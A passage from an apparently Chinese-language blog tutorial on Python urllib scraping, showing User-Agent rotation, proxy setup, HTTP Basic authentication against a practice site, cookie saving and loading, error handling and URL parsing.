class="hljs-string">&quot;Mozilla/5.0 (Linux; Android 12; ELS-AN00 Build/HUAWEIELS-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 XWEB/5075 MMWEBSDK/20230504 MMWEBID/9308 MicroMessenger/8.0.37.2380(0x2800253D) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 MiniProgramEnv/android&quot;</span>,<br>        <span class="hljs-string">&quot;Mozilla/5.0 (iPhone; CPU iPhone OS............ile/15E148 MicroMessenger/8.0.34(0x18002234) NetType/4G Language/zh_CN&quot;</span>,<br>        <span class="hljs-string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; hu; rv:1.8.0.11) Gecko/20070312 Firefox/1.5.0.11&quot;</span>,<br>        <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Int............ecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67&quot;</span>,<br>        <span class="hljs-string">&quot;Mozilla/5.0 (X1............7.6) Gecko/20050318 Firefox/1.0.2&quot;</span>,<br>        <span class="hljs-string">&quot;Mozilla/5.0 (Windows; U; Win............o) Chrome/100.0.4896.58 Safari/537.36 UCBrowser/15.4.8.1238&quot;</span>,<br>    ]<br>    <span class="hljs-comment">#使用random模块 随机取user_agent_list中的一个 </span><br>    random_user_agent = random.choice(user_agent_list)<br>    req = urllib.request.Request(url=url,method=<span class="hljs-string">&#x27;POST&#x27;</span>)<br>    <span class="hljs-comment">#添加ua头</span><br>    req.add_header(<span class="hljs-string">&quot;User-Agent&quot;</span>,random_user_agent)<br>    response = urllib.request.urlopen(req)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><br><br>user_agent()<br></code></pre></td></tr></table></figure><h4 id="自定义opener"><a href="#自定义opener" class="headerlink" title="自定义opener"></a>自定义opener</h4><p>handler：<br>HTTPDefaultErrorHandler 用于处理 HTTP 响应错误，错误都会抛出 HTTPError 类型的异常。<br>HTTPRedirectHandler 用于处理重定向。<br>HTTPCookieProcessor 用于处理 Cookies。<br>ProxyHandler 用于设置代理，默认代理为空。<br>HTTPPasswordMgr 用于管理密码，它维护了用户名密码的表。<br>HTTPBasicAuthHandler 用于管理认证，如果一个链接打开时需要认证，那么可以用它来解决认证问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.error<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handler_open</span>():<br>    url = <span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span><br>    <span class="hljs-comment">#创建自己的opener</span><br>    handler = urllib.request.HTTPHandler()<br>    opener = urllib.request.build_opener(handler)<br>    response = opener.<span class="hljs-built_in">open</span>(url)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><br>handler_open()<br>    <br></code></pre></td></tr></table></figure><h4 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h4><p>代理的类型：<br>透明：对方可以知道我们的ip<br>匿名：对方不知道我们的ip，but知道我们使用了代理<br>高匿：对方不知道我们的ip，and不知道我们使用了代理</p><p>免费代理 大都不靠谱</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.error<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handler_open</span>():<br>    <span class="hljs-keyword">try</span>:<br>        url = <span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span><br>        <span class="hljs-comment">#添加代理 ip+端口</span><br>        proxy = &#123;<br>            <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://ip:port&quot;</span><br><br>        &#125;<br>        <span class="hljs-comment">#创建代理处理器</span><br>        proxy_handler = urllib.request.ProxyHandler(proxy)<br>        <span class="hljs-comment">#创建自己的opener</span><br>        opener = urllib.request.build_opener(proxy_handler)<br>        response = opener.<span class="hljs-built_in">open</span>(url)<br>        <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    <span class="hljs-keyword">except</span> urllib.error.URLError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error: &quot;</span>,e)<br><br><br>handler_open()<br></code></pre></td></tr></table></figure><h4 id="随机代理小项目"><a href="#随机代理小项目" class="headerlink" title="随机代理小项目"></a>随机代理小项目</h4><p>代理购买：<a href="https://www.kuaidaili.com/">快代理 - 企业级HTTP代理IP云服务 (kuaidaili.com)</a></p><p>配置代理池：</p><p><img src="/img/image-20230911162945323.png" alt="image-20230911162945323"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.error<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proxy_ip</span>():<br>    url = <span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span><br>    <span class="hljs-comment">#定义多个user-agent</span><br>    ip_list = [<br>        <span class="hljs-string">&quot;http://111.224.217.xxx:19394&quot;</span>,<br>        <span class="hljs-string">&quot;http://114.220.35.xxx:19942&quot;</span>,<br>        <span class="hljs-string">&quot;http://117.87.209.xxx:23350&quot;</span>,<br>        <span class="hljs-string">&quot;http://121.233.172.xxx:22936&quot;</span>,<br>        <span class="hljs-string">&quot;http://182.38.126.xxx:16113&quot;</span><br>    ]<br>    <span class="hljs-comment">#每次取一个ip </span><br>    proxy = random.choice(ip_list)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#创建代理处理器</span><br>        proxy_handler = urllib.request.ProxyHandler(&#123;<span class="hljs-string">&#x27;http&#x27;</span>:proxy,<span class="hljs-string">&#x27;https&#x27;</span>:proxy&#125;)<br>        <span class="hljs-comment">#创建自己的opener</span><br>        opener = urllib.request.build_opener(proxy_handler)<br>        response = opener.<span class="hljs-built_in">open</span>(url)<br>        <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    <span class="hljs-keyword">except</span> urllib.error.URLError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error: &quot;</span>,e)<br><br><br>proxy_ip()<br></code></pre></td></tr></table></figure><img src="/img/image-20230911164947562.png" alt="image-20230911164947562" style="zoom:80%;" /><h4 id="授权认证"><a href="#授权认证" class="headerlink" title="授权认证"></a>授权认证</h4><p>身份认证：</p><p>HTTPBasicAuthHandler（用户基本的身份验证处理）<br>HTTPPasswordMgrWithDefaultRealm（经常和authhandler一起出现）</p><p>需要认证的测试网站：<a href="https://ssr3.scrape.center/">https://ssr3.scrape.center/</a> （admin admin）</p><img src="/img/image-20230911170845042.png" alt="image-20230911170845042" style="zoom:80%;" /><p>直接访问：</p><p><img src="/img/image-20230911170948737.png" alt="image-20230911170948737"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#创建一个密码管理器</span><br>password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()<br><span class="hljs-comment">#添加进目标url，用户名 密码</span><br>password_mgr.add_password(<span class="hljs-literal">None</span>,url,username,password)<br></code></pre></td></tr></table></figure><p>第一个参数为NONE，表示默认的域<br>如果需要添加不同域的凭证可以将none替换为对应的域名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">auth_login</span>():<br>    url = <span class="hljs-string">&quot;https://ssr3.scrape.center/&quot;</span><br>    <span class="hljs-comment">#指定用户名和密码</span><br>    username = <span class="hljs-string">&quot;admin&quot;</span><br>    password = <span class="hljs-string">&quot;admin&quot;</span><br>    <span class="hljs-comment">#创建密码管理器</span><br>    password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()<br>    <span class="hljs-comment">#添加目标url   用户名 密码</span><br>    password_mgr.add_password(<span class="hljs-literal">None</span>,url,username,password)<br>    <span class="hljs-comment">#创建一个基本密码认证处理器，并将密码管理器传递给他</span><br>    handler = urllib.request.HTTPBasicAuthHandler(password_mgr)<br>    <span class="hljs-comment">#创建网络请求的构造器</span><br>    opener = urllib.request.build_opener(handler)<br>    response = opener.<span class="hljs-built_in">open</span>(url)<br>    <span class="hljs-built_in">print</span>(response.code)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>auth_login()<br></code></pre></td></tr></table></figure><img src="/img/image-20230911170929280.png" alt="image-20230911170929280" style="zoom:80%;" /><h4 id="cookie认证"><a href="#cookie认证" class="headerlink" title="cookie认证"></a>cookie认证</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">auth_login</span>():<br>    url = <span class="hljs-string">&quot;https://ssr3.scrape.center/&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-comment">#添加认证字段 admin:admin</span><br>        <span class="hljs-string">&quot;Authorization&quot;</span>:<span class="hljs-string">&quot;Basic YWRtaW46YWRtaW4=&quot;</span><br>    &#125;<br>    req = urllib.request.Request(url=url,headers=headers)<br>    response = urllib.request.urlopen(req)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>auth_login()<br></code></pre></td></tr></table></figure><h4 id="cookiejar-读写文件"><a href="#cookiejar-读写文件" class="headerlink" title="cookiejar  读写文件"></a>cookiejar  读写文件</h4><p>写：</p><p>MozillaCookieJar  将cookie写进文件<br>可以将cookies保存成Mozilla型浏览器的cookies格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#将cookie写入文件</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> http.cookiejar<br><br>filename = <span class="hljs-string">&#x27;cookies.txt&#x27;</span><br><span class="hljs-comment">#MozillaCookieJar  将cookie写进文件</span><br><span class="hljs-comment">#可以将cookies保存成Mozilla型浏览器的cookies格式</span><br>cookie = http.cookiejar.MozillaCookieJar(filename=filename)<br><span class="hljs-comment">#保存成 libwww-perl(LWP) 格式cookies文件：</span><br><span class="hljs-comment">#cookie = http.cookiejar.LWPCookieJar(filename=filename)</span><br>handler = urllib.request.HTTPCookieProcessor(cookie)<br>opener = urllib.request.build_opener(handler)<br><br>response = opener.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>)<br><br><span class="hljs-comment"># for item in cookie:</span><br><span class="hljs-comment">#     print(item)</span><br><br>cookie.save(ignore_discard=<span class="hljs-literal">True</span>,ignore_expires=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><img src="/img/image-20230911213251107.png" alt="image-20230911213251107" style="zoom: 33%;" /><p>LWP格式：</p><img src="/img/image-20230912094156773.png" alt="image-20230912094156773" style="zoom: 50%;" /><p>读:<br>LWPCookieJar<br>保存成 libwww-perl(LWP) 格式cookies文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#读取cookie  携带该cookie去访问网页</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> http.cookiejar<br><br><br>filename = <span class="hljs-string">&#x27;cookies.txt&#x27;</span><br><span class="hljs-comment">#读：</span><br>cookie = http.cookiejar.LWPCookieJar()<br>cookie.load(filename,ignore_discard=<span class="hljs-literal">True</span>,ignore_expires=<span class="hljs-literal">True</span>)<br>handler = urllib.request.HTTPCookieProcessor(cookie)<br>opener = urllib.request.build_opener(handler)<br><br>response = opener.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;http://www.baidu.com&#x27;</span>)<br><span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><br></code></pre></td></tr></table></figure><h4 id="小项目-–-使用cookie登录网站"><a href="#小项目-–-使用cookie登录网站" class="headerlink" title="小项目 – 使用cookie登录网站"></a>小项目 – 使用cookie登录网站</h4><p>测试网站：<a href="https://www.yaozh.com/login">https://www.yaozh.com/login</a></p><p><img src="/img/image-20230912103624808.png" alt="image-20230912103624808"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> http.cookiejar<br><span class="hljs-keyword">import</span> urllib.parse<br><br><span class="hljs-comment">#1.使用账号密码登录网站</span><br><br><span class="hljs-comment">#登录url：</span><br>url = <span class="hljs-string">&#x27;https://www.yaozh.com/login&#x27;</span><br><br><span class="hljs-comment">#登录的参数：</span><br>login_data = &#123;<br>    <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;pwd&quot;</span>:<span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;pc_vcode&quot;</span>:<span class="hljs-string">&quot;86_zh-CN&quot;</span>,<br>    <span class="hljs-string">&quot;country&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;mobile&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;vcode&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;pincode&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;formhash&quot;</span>:<span class="hljs-string">&quot;636BCA3396&quot;</span>,<br>    <span class="hljs-string">&quot;backurl&quot;</span>:<span class="hljs-string">&quot;%252F%252Fwww.yaozh.com%252F&quot;</span>,    <br>&#125;<br><span class="hljs-comment">#发送登录请求</span><br>cookie = http.cookiejar.CookieJar()<br>handler = urllib.request.HTTPCookieProcessor()<br>opener = urllib.request.build_opener(handler)<br>headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;</span>,<br><br>    &#125;<br><span class="hljs-comment">#将请求参数转化为bytes</span><br>login_str = urllib.parse.urlencode(login_data).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>req = urllib.request.Request(url=url,headers=headers,data=login_str)<br><span class="hljs-comment">#如果登录成功，cookiejar会自动保存cookie</span><br>opener.<span class="hljs-built_in">open</span>(req)<br><br><span class="hljs-comment">#带着cookie去访问  登录后才能访问的页面</span><br><span class="hljs-comment">#如果请求成功 则表明cookie保存成功</span><br>login_url = <span class="hljs-string">&quot;https://www.yaozh.com/member&quot;</span><br><br>req2 = urllib.request.Request(login_url,headers=headers)<br>response = opener.<span class="hljs-built_in">open</span>(login_url)<br>data = response.read()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cookie.html&#x27;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(data)<br></code></pre></td></tr></table></figure><img src="/img/image-20230912103538210.png" alt="image-20230912103538210" style="zoom:67%;" /><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>防止程序健壮性较差  </p><p>urllib的error模块：</p><p>urlerror：继承OSError</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br><br><span class="hljs-keyword">except</span> error.URLError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e.reason)  <span class="hljs-comment">#打印错误原因</span><br>    <br>测试：<br><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> request,error<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment">#定义不存在的路径，并且不带账户密码访问</span><br>    url = <span class="hljs-string">&quot;https://ssr3.scrape.center/asdasd&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;</span>,<br>    &#125;<br>    req = urllib.request.Request(url=url,headers=headers)<br>    response = urllib.request.urlopen(req)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-keyword">except</span> error.URLError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e.reason)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230912104854648.png" alt="image-20230912104854648"></p><p>HTTPError</p><p>用于处理HTTP请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> urllib.error <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> request<br><br><span class="hljs-keyword">try</span>:<br>    url = <span class="hljs-string">&quot;https://ssr3.scrape.center/asdasd&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;</span>,<br>    &#125;<br>    req = urllib.request.Request(url=url,headers=headers)<br>    response = urllib.request.urlopen(req)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-keyword">except</span> HTTPError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;http error: &quot;</span>,e)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230912105624185.png" alt="image-20230912105624185"></p><p>超时异常  —  URLError处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> urllib.error <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment"># url = &quot;https://ssr3.scrape.center/asdasd&quot;</span><br>    <span class="hljs-comment"># headers = &#123;</span><br>    <span class="hljs-comment">#     &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;,</span><br>    <span class="hljs-comment"># &#125;</span><br>    <span class="hljs-comment"># req = urllib.request.Request(url=url,headers=headers)</span><br>    <span class="hljs-comment"># response = urllib.request.urlopen(req)</span><br>    <span class="hljs-comment"># print(response.read().decode(&#x27;utf-8&#x27;))</span><br>    url = <span class="hljs-string">&quot;https://www.baidu.com&quot;</span><br>    <span class="hljs-comment">#设置超时时间为0.01 触发超时错误</span><br>    response = urllib.request.urlopen(url=url,timeout=<span class="hljs-number">0.01</span>)<br><br><span class="hljs-comment">#except HTTPError as e:</span><br>    <span class="hljs-comment">#print(&quot;http error: &quot;,e)</span><br><span class="hljs-keyword">except</span> URLError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e.reason)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(e.reason,socket.timeout):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Time out!!&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="链接的组成和解析"><a href="#链接的组成和解析" class="headerlink" title="链接的组成和解析"></a>链接的组成和解析</h3><p><strong>urlparse:python标准库中的一个模块，解析和操作url</strong></p><ul><li><strong>标准url链接格式:</strong></li></ul><p>scheme:&#x2F;&#x2F;netloc&#x2F;path;params?query#fragment</p><p>scheme（协议） http or https<br>netloc（网络位置） host<br>path（路径）<br>params（携带的参数）<br>query（查询参数）<br>fragment（片段） 内部导航</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><br>url = <span class="hljs-string">&#x27;http://www.baidu.com/index.html;user?id=0#comment&#x27;</span><br><br>result = urlparse(url=url)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(result),result)<br><br>结果：<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;urllib.parse.ParseResult&#x27;</span>&gt; <br>ParseResult(scheme=<span class="hljs-string">&#x27;http&#x27;</span>, netloc=<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>, path=<span class="hljs-string">&#x27;/index.html&#x27;</span>, params=<span class="hljs-string">&#x27;user&#x27;</span>, query=<span class="hljs-string">&#x27;id=0&#x27;</span>, fragment=<span class="hljs-string">&#x27;comment&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li><strong>urlunparse:与urlparse相反，组合url</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, urlunparse<br>data = [<span class="hljs-string">&#x27;http&#x27;</span>,<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>,<span 